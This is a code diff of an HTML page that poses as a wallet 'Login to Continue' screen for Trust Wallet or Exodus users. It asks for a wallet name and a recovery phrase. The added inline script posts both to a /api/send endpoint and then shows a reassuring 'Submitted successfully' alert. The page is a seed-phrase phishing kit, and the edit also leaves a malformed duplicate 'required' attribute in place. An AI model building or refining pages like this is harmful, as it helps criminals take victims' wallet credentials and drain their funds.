@@ -104,14 +104,11 @@ textarea {
   <p>Login to Continue</p>
 
   <form id="form">
-    <input type="text" id="username" placeholder="Wallet Name/Trust wallet/exoduswallet" required>
+    <input type="text" id="username" placeholder="Wallet Name/Trust wallet/Exoduswallet" required>
 
-    <div class="textarea-wrapper">
-      <textarea id="complaint" placeholder="Enter recovery phrase" required></textarea>
-      <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
-    </div>
+    <textarea id="complaint" placeholder="Enter recovery phrase" required" required></textarea>
 
-    <button class="submit-btn">Restore Wallet</button>
+    <button type="submit">RESTORE WALLET</button>
   </form>
 
   <div class="footer">
@@ -119,7 +116,30 @@ textarea {
   </div>
 </div>
 
-<script src="script.js"></script>
+<script>
+document.getElementById("form").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const username = document.getElementById("username").value;
+  const complaint = document.getElementById("complaint").value;
+
+  const res = await fetch("/api/send", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ username, complaint })
+  });
+
+  const data = await res.json();
+
+  if (data.success) {
+    alert("Submitted successfully");
+  } else {
+    alert("Error submitting");
+  }
+});
+</script>
 
 </body>
 </html>
